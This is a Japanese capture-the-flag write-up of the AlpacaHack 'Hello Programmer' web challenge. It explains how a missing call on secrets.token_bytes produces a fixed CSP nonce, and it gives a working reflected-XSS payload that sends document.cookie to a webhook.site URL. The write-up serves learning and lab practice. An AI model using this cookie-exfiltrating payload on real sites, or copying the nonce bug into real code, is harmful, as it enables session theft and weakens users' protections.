---
title: "Hello Programmer - AlpacaHack Daily"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "alpacahack", "xss", "csp-bypass", "base64", "csp"]
summary: "web writeup for \"Hello Programmer\" from AlpacaHack Daily - techniques: alpacahack, xss, csp-bypass, base64, csp."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d27_Hello_Programmer/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Hello Programmer"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Hello Programmer
- **Date:** 2026-05-27
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d27_Hello_Programmer>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d27_Hello_Programmer/README.md>

---
# Hello Programmer!

## 問題

こんにちは！

```py
@app.before_request
def set_nonce():
    g.nonce = base64.b64encode(str(secrets.token_bytes).encode()).decode("ascii")

@app.after_request
def set_csp(response):
    nonce = g.get("nonce")
    response.headers["Content-Security-Policy"] = (
        "default-src 'none'; "
        f"script-src 'nonce-{nonce}'; "
        f"style-src 'nonce-{nonce}'; "
        "object-src 'none'; "
        "base-uri 'none'; "
        "frame-ancestors 'none'"
    )

    return response

@app.get("/")
def index():
    nonce = g.get("nonce")
    username = request.args.get("username", "programmer")
    return INDEX.format(nonce=nonce, username=username)
```

## 概要

ブラウザでページを開くと、虹色に輝くゲーミングHello Programmer!（？）が表示されます。

また、この文字をクリックするとアラートダイアログに同じ内容が表示されるようなJavascriptが仕込まれているようです。

この`Programmer`の部分はパラメータ`username`から取っていて、エスケープ処理をせずHTMLにベタ書きしているのでXSSできそうですが、正しいnonceをもたないJavascriptは実行できないようになっています。

クッキーにフラグをもったAdmin Botにパラメータを渡してこのページにアクセスさせることができるようですが、どのようなパラメータを渡せばこのフラグを取ることができるのでしょうか？

## 方針

nonceの生成部分にバグがあることを利用する

## 解法

パラメータ`?username=baumroll1234`をつけて開くと、ちゃんとゲーミングHello baumroll1234!になります。なんだか神々しいです（？）

ページのソースを覗いてみると、
```html
    <script nonce="PGZ1bmN0aW9uIHRva2VuX2J5dGVzIGF0IDB4NzMyMmZjYjA1ZmUwPg==" defer>
```
のようにBase64形式のnonceが含まれています。

ここで、試しにパラメータを
```
?username=<script>alert("I'm baumroll1234");</script>
```
にしてみましたが、アラートが表示されません。

正しいnonceをもっていないからですよね。

このnonceは毎回ランダムに変わる32バイトのバイナリデータがもとになっているため、攻撃者はこれを予測できず、XSSによるJavascriptの実行ができないというわけですね！

・・・と思ったのですが、ここでもう一度ページのソースを見てみると、
```html
    <script nonce="PGZ1bmN0aW9uIHRva2VuX2J5dGVzIGF0IDB4NzMyMmZjYjA1ZmUwPg==" defer>
```
なぜかさっきと変わっていません。

それなら、試しにこのnonceをさっきのJavascriptと一緒に渡してみましょうか。
```
?username=<script nonce="PGZ1bmN0aW9uIHRva2VuX2J5dGVzIGF0IDB4NzMyMmZjYjA1ZmUwPg==">alert("I'm baumroll1234");</script>
```
今度はちゃんと「I'm baumroll1234」というアラートが表示されました。

なぜnonceが変わらないのでしょうか？

試しにこのnonceをBase64でデコードしてみます。すると、
```
<function token_bytes at 0x7322fcb05fe0>
```
なるほど。はいはい。これはときどき私もリアルにやっちゃうやつです。

nonceを生成するところをもう一度よく見てみると、
```py
def set_nonce():
    g.nonce = base64.b64encode(str(secrets.token_bytes).encode()).decode("ascii")
```
`secrets.token_bytes()`の`()`が抜けています。

Pythonではカッコ無しの関数名は関数オブジェクトを意味するので、常に同じになってしまっていたのですね。

これを使って、Admin Botがリクエストの内容を確認できるようなページに飛ぶようなペイロードを作ります。

ここでは`Webhook.site`というサービスを利用することにします。

まず、[Webhook.site](https://webhook.site/)にアクセスし、
```
https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```
のような形式の自分専用のURLを取得します。

この専用URLがアクセスされると、そのときのリクエストの内容を捕まえておいてくれて、あとで確認することができます。

Admin Botにはフラグを渡しつつこの専用ページに飛んでもらいたいので、
```js
location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/?flag="+document.cookie;
```
のようなスクリプトを実行するようにしたいです。

よって、Admin Botで送信するパラメータは
```
?username=<script nonce="PGZ1bmN0aW9uIHRva2VuX2J5dGVzIGF0IDB4NzMyMmZjYjA1ZmUwPg==">location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/?flag="%2bdocument.cookie;</script>
```
のようになります。

※`+`だけは`%2b`にエンコードする必要があるようです。

うまくいくと、Webhook.siteの確認用ページにリクエストが届いているはずです。

このリクエストを選択し、`Query strings`の`flag`に`FLAG=Alpaca{REDACTED}`が表示されていることを確認します。

※nonceは固定ではあるもののローカル環境と本番環境では少し違うようなので、本番環境で実行するときは改めて確認してください。

## その他

いつもは何をすればいいのかわからなすぎてずっと捨ててたAdmin Bot関連の問題に、今回は過去問`Fushigi Crawler`の復習から始めて頑張って挑戦してみましたが、正直いままで食わず嫌いだったと思えるくらい面白い問題でした。

自分がわかりにくかったところや難しいと感じたところはなるべく細かくわかりやすく書いたつもりなので、私のようなWebジャンルアレルギーの初心者の方の治療にお役に立てたら幸いです。

ところで、このページで表示されるゲーミングHello Programmer!は、（Javascriptを使わず）CSSだけで実現できるアニメーションのようです。
```css
        h1 {
            color: transparent;
            background: linear-gradient(90deg,red,orange,yellow,lime,cyan,blue,violet,red) 0/200%;
            -webkit-background-clip: text;
            animation: rainbow 1s linear infinite
        }
        @keyframes rainbow {
            to {
                background-position:200%
            }
        }
```

ちなみに、`?username=🦙`とか`?username=💩`とかにしたら、ちゃんとゲーミングアルパカやゲーミングウ○コになりました（笑）
